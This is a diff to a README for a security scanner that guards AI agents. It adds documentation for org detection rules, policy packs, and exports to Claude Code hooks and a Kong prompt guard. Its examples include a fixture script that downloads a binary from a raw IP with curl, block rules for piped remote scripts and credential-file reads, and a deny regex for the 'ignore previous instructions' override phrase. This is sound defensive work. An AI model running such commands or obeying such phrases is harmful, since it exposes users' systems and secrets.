@@ -113,6 +113,132 @@ Ids are `SW-SKL-NNN` (skill packages), `SW-MCP-NNN` (probed MCP servers) and `SW
 
 Ids 016 to 018 and 020 to 030 are reserved. `RuleSet.baseline()` returns these rules; `ruleset.with_rules(extra)` adds your own `Rule` objects built with `spellwarden_scan.rules.make_rule`.
 
+## Org rules, packs and exports
+
+Since 1.1.0 the engine also holds what the hosted product calls Ward: rules an organisation writes as data (org rules), policy packs, and the exports that turn a pack into enforcement for Claude Code hooks and Kong. All of it is pure, like the rest of the engine. The `spellwarden` command does not load org rules or packs yet; it scans with the baseline rules only.
+
+### Org rules
+
+An org rule is a JSON object that `validate_org_rule(spec)` checks and `compile_org_rule(spec)` turns into a `Rule` that `RuleSet.with_rules` accepts. A refused spec raises `OrgRuleError` with a `code` (`bad_id`, `bad_title`, `bad_severity`, `bad_area`, `bad_mapping`, `bad_target`, `bad_detection`, `bad_glob`, `pattern_too_long`, `pattern_syntax`, `pattern_too_complex`, `bad_predicate`, `bad_values`, `unknown_key`) and a one-sentence `message` that names the position of a pattern error.
+
+- `id` is `SW-ORG-001` to `SW-ORG-999`; `title` 1 to 120 characters on one line; `severity` `critical`, `high`, `medium` or `low`; `owasp` and `nist` at most five identifiers each from the lists the baseline rules use; `malicious` (only with `critical`) makes a finding quarantine the package, as the baseline's malicious indicators do; unknown keys are refused.
+- `area` `skill` takes a pattern detection: `{"kind": "pattern", "files": "**/*.sh", "in": "commands", "pattern": "...", "case_sensitive": false}`. `files` is a path glob inside the skill (`*`, `?` and `[...]` within one folder, `**` for any number of folders; default `**`). `in` is `lines` (every line of every selected text file, the default) or `commands` (every shell command of the selected scripts and of the fenced code blocks of the selected Markdown files, with `\`, `|`, `&&` and `||` continuations joined, which is what a Claude Code hook sees as a Bash command). One finding per matching line or command.
+- `area` `mcp` takes one of eight server checks: `{"kind": "probe", "predicate": "auth_mode_in", "values": ["none", "static-key"]}`. The predicates are `auth_mode_in`, `transport_in`, `deprecated_feature_any`, `spec_version_below` (also true when the version is unknown), `endpoint_host_in` and `endpoint_host_not_in` (lower-case host names, or `*.example.com` for every subdomain, which does not match `example.com` itself), and `tool_name_matches` and `tool_description_matches`, which take a `pattern` and give one finding per tool at `tool:<name>`. A stdio server has no endpoint and is judged by `transport_in` and the two tool checks only.
+- `targets` names the exports that enforce the rule: `claude-code-hooks` (a pattern rule with `"in": "commands"`) and `kong` (any pattern rule). A server check has no target.
+
+Patterns use a small subset of regular expressions that the engine reads in bounded time and that Kong reads the same way:
+
+| Construct | Allowed |
+|---|---|
+| Literal characters | Any character except `\ . [ ] ( ) \| * + ? { } ^ $`, which are written escaped (`\.`, `\(`). `\/` and `\-` are accepted escapes. |
+| Classes | `.`, `\s \S \d \D \w \W`, bracket classes `[...]` and `[^...]` with literal members, escapes and ranges such as `a-z`; no nested `[`, no `[:name:]`. |
+| `\b` | A word boundary; it cannot be quantified. |
+| Anchors | `^` only as the first character of the pattern, `$` only as the last. |
+| Quantifiers | `?`, `*`, `+`, `{m}` and `{m,n}`, each on exactly one character, escape, `.` or bracket class. No lazy or possessive forms, no `{m,}`. |
+| Groups | `(a\|b\|c)`: alternatives made of characters and classes with at most `?`, `{m}` or `{m,n}`; a group may be followed by `?`; groups do not nest and never capture. |
+| Gaps | A `.*` outside a group splits the pattern into parts, matched one after the other. |
+| Per part | At most one `*` or `+` besides the gaps. |
+| Start of a part | A part may not start with `*` or `+`, also after optional items (`a?\s+x` is refused). |
+| Next to a repeat | A repeat whose count varies (`?`, `*`, `+`, `{m,n}` with `m` below `n`) may not sit next to an item that can match the same character, in any path through the part (groups and optional items included, `\b` ignored): `a+a`, `\s*\s`, `x.{0,100}y` and `x[a-z]+[a-c]` are refused, `x\s+y` is accepted. |
+| Not allowed | Backreferences, lookahead and lookbehind, inline flags, named groups, `\A \Z \G`, `\x \u \N` and octal escapes, a `\|` outside a group, a quantified group other than `?`, nested groups. |
+
+A pattern that breaks one of the rules above is `pattern_syntax`; one that is well formed but exceeds a limit below, or breaks the start-of-part or next-to-a-repeat rule (which keep the matching time bounded), is `pattern_too_complex`.
+
+The limits, which `spellwarden_scan.PATTERN_LIMITS` holds:
+
+<!-- pattern-limits:start -->
+| Limit | Value | What it bounds |
+|---|---|---|
+| `max_length` | 300 | Characters in a pattern |
+| `max_parts` | 4 | Parts between the `.*` gaps |
+| `max_groups` | 4 | Groups in one part |
+| `max_alternatives` | 16 | Alternatives in one group |
+| `max_class_members` | 64 | Members of one bracket class |
+| `max_repeat` | 100 | The largest number in `{m}` and `{m,n}` |
+| `window` | 4096 | Characters read at once from a long line or command |
+| `overlap` | 512 | Characters two consecutive windows share |
+<!-- pattern-limits:end -->
+
+A line or command longer than 4096 characters is read in windows of 4096 characters that start every 3584 characters, so a match longer than 512 characters that crosses a window boundary can be missed. Patterns are case-insensitive unless `case_sensitive` is true. The engine reads `\w`, `\d`, `\s` and case-insensitivity with Unicode rules, while Kong's PCRE reads them for ASCII only, so a pattern that relies on non-ASCII letters or digits can match differently in Kong. A UTF-8 byte order mark at the start of a file is not part of its first line, so `^` works there. Org rules are an addition to the baseline rules, which still run in full: an evasion of one pattern (a longer match, an encoding) is still met by the baseline's own obfuscation and decoding rules.
+
+`scan_skill_package` and `evaluate_probe` take `org_rule_budget=OrgRuleBudget(clock=..., seconds=...)`. The engine reads the clock you pass before each unit an org rule reads, and stops evaluating org rules once the seconds have passed; baseline rules are never budgeted. The result's `org_rules_incomplete` lists the org rules that did not read every unit. A non-empty list means the policy was not fully evaluated: treat that result as incomplete, never as clean (the hosted product ends such a scan `incomplete`).
+
+<!-- orgrules-example:start -->
+```python
+import time
+
+from spellwarden_scan import OrgRuleBudget, RuleSet, baseline_pack, build_export, compile_org_rule, scan_skill_package
+
+rule = compile_org_rule({
+    "id": "SW-ORG-001", "title": "Downloads a binary from a raw IP address", "severity": "high", "area": "skill",
+    "owasp": ["ASI04"], "nist": ["SR-3"], "targets": ["claude-code-hooks"],
+    "detection": {"kind": "pattern", "files": "**/*.sh", "in": "commands",
+                  "pattern": "(curl|wget)\\s.*https?://[0-9]{1,3}\\.[0-9]{1,3}\\.", "case_sensitive": False},
+})
+files = {"SKILL.md": b"---\nname: fetcher\ndescription: Fetches a tool.\n---\nRun scripts/get.sh.\n",
+         "scripts/get.sh": b"curl -fsSL http://203.0.113.7/tool -o tool\n"}
+result = scan_skill_package(files, RuleSet.baseline().with_rules([rule]),
+                            org_rule_budget=OrgRuleBudget(clock=time.monotonic, seconds=10))
+if result.org_rules_incomplete:
+    print("incomplete, these org rules did not read every line:", result.org_rules_incomplete)
+print([finding.rule_id for finding in result.findings if finding.rule_id.startswith("SW-ORG-")])
+
+export = build_export(baseline_pack(), "claude-code-hooks", built_at="2026-12-01T00:00:00Z", mode="managed")
+print(sorted(export))
+```
+<!-- orgrules-example:end -->
+
+### Policy packs
+
+A policy pack is a JSON document (schema 1, `schemas/pack.schema.json`) naming which of the eight enforcement rules are on and carrying full copies of the org rules it includes, so a published version keeps its meaning when the rules change later. `validate_pack(doc)` checks a document and returns a `PackDocument` (refusals raise `PackError` with the code `bad_schema`, `bad_pack`, `bad_rules`, `bad_org_rule` or `too_many_org_rules`); `canonical_json(doc)` (sorted keys, no whitespace, UTF-8) and `pack_sha256(doc)` identify a version; `baseline_pack()` is the Spellwarden Baseline for Agents, version `1.0`, with every enforcement rule on (also in `src/spellwarden_scan/packs/baseline.json`). Pack names and descriptions, and org rule titles, refuse control, format and line-separator characters (`valid_line`, `valid_block`).
+
+The enforcement rules (`ENFORCEMENT_RULES`), and what an export of this release enforces:
+
+| Id | Rule | Enforced by (1.1.0) |
+|---|---|---|
+| `SW-HK-001` | Block remote scripts piped to a shell in agent shell tools | Claude Code hooks |
+| `SW-HK-002` | Block reads of credential files (`~/.aws`, `~/.ssh`, `.env`) | Claude Code hooks |
+| `SW-GW-003` | Deny MCP upstreams without OAuth | Not enforced by an export in this version (needs Kong's MCP plugins) |
+| `SW-GW-004` | Prompt-injection deny patterns on prompts and tool results | Kong, prompts only |
+| `SW-EG-005` | Sandbox egress only to registry-admitted hosts | Not enforced by an export in this version |
+| `SW-GW-006` | Destructive tool verbs require human approval | Claude Code hooks (asks for approval) |
+| `SW-RG-007` | Registry admits only curated, auth-enabled entries on spec 2026-07-28 with no open critical or high finding | The hosted private registry's admission policy, not an export |
+| `SW-OB-008` | Emit an audit record for every tool call | Not enforced: the Claude Code export writes a local activity log, which is not an audit trail |
+
+"Enforced" means enforced where the export is deployed in a way the developer cannot change: for Claude Code that is the managed mode below.
+
+### Exports
+
+`build_export(pack, target, built_at=..., mode=...)` returns the files of an export as `{path: bytes}`; `target` is one of `EXPORT_TARGETS` (`claude-code-hooks`, `kong`), and `PLANNED_TARGETS` (`zuplo`, `agentcore-policy`, `cloudflare-egress`) are not available yet. Every export holds `SPELLWARDEN-README.md`, which lists what the target enforces, what it cannot enforce and why, how to install it and the limits of its mode, and ends with: Validate field names against the vendor's current documentation before use.
+
+**Claude Code hooks.** One guard script, `spellwarden_guard.py` (Python 3.8 or newer, standard library only, the pack's checks compiled in, never opening the network), run by a `PreToolUse` hook for Bash, PowerShell (Claude Code's shell tool on Windows), Read, Grep, Glob and MCP tools, and by a `PostToolUse` hook when SW-OB-008 is on. It denies piped remote scripts and credential-file reads, asks before destructive commands and destructive MCP tool verbs, and applies org rules with the `claude-code-hooks` target (deny for critical or high, ask for medium or low); when one command matches both, the deny wins. The command patterns are written for POSIX shells and read PowerShell commands as text. Windows paths are checked as given and with `\` read as `/`. On unreadable input it prints nothing and exits 0: the guard never blocks on its own failure, and a missing interpreter or a timeout lets the tool call proceed. Every hook runs it as `python3 -I`, so the checkout cannot plant a module it imports. `SHA256SUMS` lists the script's SHA-256.
+
+- Project mode (`mode="project"`, advisory): `.claude/settings.json` with the hooks, `.claude/hooks/spellwarden_guard.py`, `.claude/.gitignore` (the activity log), `SHA256SUMS` and `SPELLWARDEN-README.md`, for committing to the repository. The repository controls these files: any branch can change, replace or remove the script or the settings, so this mode helps developers who want it and enforces nothing against a checkout that does not.
+- Managed mode (`mode="managed"`, enforceable): `managed/linux/managed-settings.json`, `managed/macos/managed-settings.json`, `managed/windows/managed-settings.json`, `managed/spellwarden_guard.py`, `SHA256SUMS` and `SPELLWARDEN-README.md`. Administrators install the script read-only, owned by root or the Administrators group, at an absolute path outside every checkout, verify it against `SHA256SUMS`, and place the platform's settings file where Claude Code reads managed settings; each settings file sets `allowManagedHooksOnly`, so user, project and plugin hooks are ignored. Where a `managed-settings.json` already holds the organisation's policy, add this file's keys to it or place it as `managed-settings.d/50-spellwarden.json` beside it, rather than replacing it. On WSL, `/etc/claude-code` can be written by the user, so the managed mode is not enforced there.
+
+| Platform | Script path | Managed settings file | Status |
+|---|---|---|---|
+| Linux | `/etc/claude-code/spellwarden/spellwarden_guard.py` | `/etc/claude-code/managed-settings.json` | not yet verified on Linux |
+| macOS | `/Library/Application Support/ClaudeCode/spellwarden/spellwarden_guard.py` | `/Library/Application Support/ClaudeCode/managed-settings.json` | not yet verified on macOS |
+| Windows | `C:\Program Files\ClaudeCode\spellwarden\spellwarden_guard.py` | `C:\Program Files\ClaudeCode\managed-settings.json` | not yet verified on Windows |
+
+A platform is verified once the CI job `managed-guard` and a check by hand with Claude Code have passed on it; the same list (`spellwarden_scan.exports.hooks.MANAGED_VERIFIED`) decides which platforms every managed export's README names as not verified yet. The hook commands quote the path, for example `python3 -I "/Library/Application Support/ClaudeCode/spellwarden/spellwarden_guard.py" pre`, and on Windows `py -3 -I "C:\Program Files\ClaudeCode\spellwarden\spellwarden_guard.py" pre`, which reads the same in Git Bash and in PowerShell, the shells Claude Code runs hook commands with on Windows (`sh -c` on Linux and macOS). The export does not set the hook field `onFailure`: the guard never blocks on its own failure, and an administrator who wants failures to block can set `"onFailure": "block"` where their Claude Code version offers it. With SW-OB-008 on, the guard appends one line per tool call (time, session id, tool name; never the tool's input or output) to `spellwarden-activity.jsonl` in the project's `.claude/` (project mode) or the user's `~/.claude/` (managed mode), refusing links and anything that is not a regular file, with mode 0600, rotated to `.1` at 5 MiB. It is a local activity log the user can read, change or delete, not an audit trail.
+
+**Kong.** `kong/spellwarden-<pack id>-<version>.yaml` (for the baseline, `kong/spellwarden-baseline-1.0.yaml`) and `SPELLWARDEN-README.md`: a decK file with one global `ai-prompt-guard` plugin whose `deny_patterns` are the engine's prompt-injection patterns (SW-GW-004, prompts only) and the org rules with the `kong` target. Scope it to your AI routes or services by adding `route:` or `service:` before `deck gateway sync`:
+
+```yaml
+# Spellwarden policy export: pack "Spellwarden Baseline for Agents" 1.0, built 2026-12-01T00:00:00Z.
+# Enforced here: SW-GW-004 (prompts only).
+# Not enforced by this target: SW-HK-001 (Claude Code hooks), SW-GW-003 (needs Kong's MCP plugins), ...
+# Validate field names against the vendor's current documentation before use.
+_format_version: '3.0'
+plugins:
+- name: ai-prompt-guard
+  config:
+    deny_patterns:
+    - (?i)ignore (all |any |the |your )?(previous|prior|above|earlier) (instructions|prompts|rules)
+```
+
 ## The `spellwarden` command
 
 ```
@@ -255,7 +381,7 @@ make check     # ruff, pytest, uv build
 
 ## Use it in CI
 
-The same scanner runs in three wrappers, released with one version number.
+The same scanner runs in three wrappers, released with one version number. The engine release 1.1.0 (org rules, packs and exports) changes nothing the scanner does, so the Action and the component stay at 1.0.0.
 
 **GitHub Actions.** Pin the Action by commit and keep the version in a comment. The workflow, not the Action, grants the permissions:
 
